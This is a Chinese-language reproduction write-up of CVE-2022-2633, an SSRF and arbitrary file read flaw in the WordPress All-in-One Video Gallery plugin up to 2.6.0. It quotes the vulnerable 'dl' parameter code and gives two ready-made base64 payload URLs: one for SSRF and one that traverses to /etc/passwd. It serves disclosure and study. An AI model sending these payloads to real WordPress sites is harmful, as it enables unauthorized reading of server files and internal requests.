# WordPress All-in-One Video Gallery video.php 任意文件读取漏洞 CVE-2022-2633

## 漏洞描述

WordPress All-in-One Video 插件 Gallery video.php文件中存在SSRF以及任意文件读取漏洞，攻击者通过发送特定的请求包读取任意文件

## 漏洞影响

<a-checkbox checked>WordPress All-in-One Video Gallery  <= 2.6.0</a-checkbox></br>

## 插件名

<a-checkbox checked>All-in-One Video Gallery</a-checkbox></br>

<a-checkbox checked>https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip</a-checkbox></br>

## 漏洞复现

对比漏洞修复的文件找到出现漏洞的文件 wp-content/plugins/all-in-one-video-gallery/public/video.php

![img](../../../.vuepress/public/img/1665396901441-051cdcb4-9932-48f7-96f7-b57aa55b37b0.png)

这里接收 dl 参数，dl 参数不为 数字类型时，参数将 base64 解码传入

```sql
		if ( is_numeric( $_GET['dl'] ) ) {
			$file = get_post_meta( (int) $_GET['dl'], 'mp4', true );
		} else {
			$file = base64_decode( $_GET['dl'] );
		}

		if ( empty( $file ) ) {
			die( esc_html__( 'Download file URL is empty.', 'all-in-one-video-gallery' ) );
           	exit;
        }
```

![img](../../../.vuepress/public/img/1665398476539-d7b73586-47fb-49ac-aefc-75518d40abf3.png)

当传入的参数中不存在 http:// 或 https:// 时，参数 $formatted_path 的值改变

![img](../../../.vuepress/public/img/1665400025228-ec8b2210-1683-4f95-b05d-085338323586.png)

当 $formatted_path 为 url 时存在 SSRF漏洞，传入 base64编码 的目标URL就可以得到回显

```sql
/index.php/video/?dl=aHR0cHM6Ly93d3cuYmFpZHUuY29t
```

![img](../../../.vuepress/public/img/1665400131718-e35e3a69-9fef-4717-b22c-25e07f659dac.png)

看向代码最后的片段，则存在任意文件读取漏洞

![img](../../../.vuepress/public/img/1665400190046-5f6608e0-f8d6-4291-ba23-9d468a95ac46.png)

```sql
/index.php/video/?dl=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
```

![img](../../../.vuepress/public/img/1665400254761-b7c390f4-6412-4104-a806-856aabf21e98.png)